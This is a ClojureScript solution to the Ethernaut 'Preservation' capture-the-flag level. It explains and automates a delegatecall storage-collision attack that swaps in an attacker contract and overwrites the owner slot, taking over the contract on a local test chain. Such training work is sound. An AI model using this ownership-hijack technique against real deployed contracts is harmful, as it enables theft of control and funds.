(ns ctf.ethernaut.preservation
  "To break the `Preservation` contract we must understand that
  if contract A delegatecall's contract B then, on the evm,
  contract B's code is executed with the storage of contract A!

  Here owner's address is at storage slot 2. First we will
  deploy a 'malicious' contract. 
   
  The `LibraryContract` updates the storage slot 0 of its 
  caller with the argument that is passed to the 
  function `setFirstTime`.

  We will make `LibraryContract` update the slot 0 of `Preservation`
  contract with our 'malicious' contract.

  In our malicious contract, we will mimick the API of the actual
  Library contract. But we will make it overwrite the
  slot 2 (where owner's address is stored) of the caller contract
  with our own address. 
   
  To claim the ownership of the contract, we call `setFirstTime` 
   again but this time with the 'player' addr."
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]])
  (:require-macros [ctf.core :refer [try-async]]))


;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (w/get-player! w/local-provider))


(defn deploy-preservation!
  "Deploys the Preservation contract using Owner's wallet!
   Returns the `js/Promise`."
  [lib1-addr lib2-addr]
  (let [contract (u/contract
                  :preservation
                  w/local-wallet)]
    (.deploy contract lib1-addr lib2-addr)))


(defn deploy-library!
  "Deploys the TZ Library contract using Owner's wallet!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract
                  :preservation/library
                  w/local-wallet)]
    (.deploy contract)))


(defn deploy-attacker!
  "Deploys the Attacker Contract using player's wallet!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract
                  :preservation/attack
                  player)]
    (.deploy contract)))


(defn preservation-attack
  []
  (try-async
   [lib1 (<p! (deploy-library!))
    lib2 (<p! (deploy-library!))
    preservation (<p!
                  (deploy-preservation!
                   (.-address lib1)
                   (.-address lib2)))
    attacker (<p! (deploy-attacker!))]
   (do
     (<p! (.setFirstTime preservation
                    (.-address attacker)))
     (<p! (.setFirstTime preservation
                         (.-address player)))
     (<p! (.owner preservation)))))


(comment

  ;; Execute the block below to attack
  ;; should print the owner's address
  (a/take! (preservation-attack)
           #(.log js/console %))

  (-> (u/compile-all!)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  (def lib1 (atom ""))
  (-> (deploy-library!)
      (.then #(reset! lib1 %))
      (.catch #(.log js/console %)))


  (def lib2 (atom ""))
  (-> (deploy-library!)
      (.then #(reset! lib2 %))
      (.catch #(.log js/console %)))

  (def preservation (atom ""))
  (-> (deploy-preservation! (.-address @lib1)
                            (.-address @lib2))
      (.then #(reset! preservation %))
      (.catch #(.log js/console %)))

  (def attack (atom ""))
  (-> (deploy-attacker!)
      (.then #(reset! attack %))
      (.catch #(.log js/console %)))


  (-> (.setFirstTime @preservation
                     (.-address @attack))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  (-> (.owner @preservation)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (-> (.getStorageAt w/local-provider
                     (.-address @preservation)
                     #_(.-address @attack)
                     2)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (-> (.setFirstTime @preservation
                     (.-address player))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  )
